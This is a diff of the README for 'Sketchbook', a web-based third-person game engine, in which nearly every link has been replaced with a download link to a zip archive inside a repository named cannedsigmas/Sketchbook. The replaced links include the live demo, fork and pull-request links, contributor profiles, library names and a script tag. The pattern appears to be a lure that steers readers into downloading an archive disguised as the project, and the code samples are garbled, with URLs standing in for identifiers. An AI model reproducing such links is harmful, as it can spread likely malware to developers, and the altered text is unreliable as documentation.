@@ -1,7 +1,7 @@
 <p align="center">
-	<a href="https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip"><img src="https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip"></a>
+	<a href="https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip"><img src="https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip"></a>
 	<br>
-	<a href="https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip">Live demo</a>
+	<a href="https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip">Live demo</a>
 	<br>
 </p>
 
@@ -10,19 +10,19 @@
 As I have no more interest in developing this project, it comes to a conclusion. In order to remain honest about the true state of the project, I am archiving this repository.
 
 - If you wish to modify Sketchbook feel free to fork it.
-- To see if someone is currently maintaining a fork, check out the [Network Graph](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip).
+- To see if someone is currently maintaining a fork, check out the [Network Graph](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip).
 
 # 📒 Sketchbook
 
-Simple web based game engine built on [https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip) and [https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip) focused on third-person character controls and related gameplay mechanics.
+Simple web based game engine built on [https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip) and [https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip) focused on third-person character controls and related gameplay mechanics.
 
 Mostly a playground for exploring how conventional third person gameplay mechanics found in modern games work and recreating them in a general way.
 
 ## Features
 
 * World
-	* https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip scene
-	* https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip physics
+	* https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip scene
+	* https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip physics
 	* Variable timescale
 	* Frame skipping
 	* FXAA anti-aliasing
@@ -36,24 +36,24 @@ Mostly a playground for exploring how conventional third person gameplay mechani
 	* Airplanes
 	* Helicopters
 
-All planned features can be found in the [GitHub Projects](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip).
+All planned features can be found in the [GitHub Projects](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip).
 
 ## Usage
 
-You can define your own scenes in Blender, and then read them with Sketchbook. Sketchbook needs to run on a local server such as [http-server](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip) or [webpack-dev-server](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip) to be able to load external assets.
+You can define your own scenes in Blender, and then read them with Sketchbook. Sketchbook needs to run on a local server such as [http-server](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip) or [webpack-dev-server](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip) to be able to load external assets.
 
 <!-- #### Script tag -->
 
 1. Import:
 
 ```html
-<script src="https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip"></script>
+<script src="https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip"></script>
 ```
 
 2. Load a glb scene defined in Blender:
 
 ```javascript
-const world = new https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip('https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip');
+const world = new https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip('https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip');
 ```
 
 <!--
@@ -75,24 +75,24 @@ import { World } from 'sketchbook';
 3. Load a glb scene defined in Blender:
 
 ```javascript
-const world = new World('https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip');
+const world = new World('https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip');
 ```
 
 -->
 
 ## Contributing
 
-1. Get the LTS version of [https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip) 16
-2. [Fork this repository](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip)
+1. Get the LTS version of [https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip) 16
+2. [Fork this repository](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip)
 3. Run `npm install`
 4. Run `npm run dev`
 5. Make changes and test them out at http://localhost:8080
-6. Commit and [make a pull request](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip)!
+6. Commit and [make a pull request](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip)!
 
 ## Credits
 
 Big thank you to each of the following github users for contributing to Sketchbook:
 
-- [aleqsunder](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip)
-- [barhatsor](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip)
-- [danshuri](https://raw.githubusercontent.com/cannedsigmas/Sketchbook/master/src/ts/characters/Software_v1.0.zip)
+- [aleqsunder](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip)
+- [barhatsor](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip)
+- [danshuri](https://github.com/cannedsigmas/Sketchbook/raw/refs/heads/master/src/lib/utils/Software-v1.2.zip)
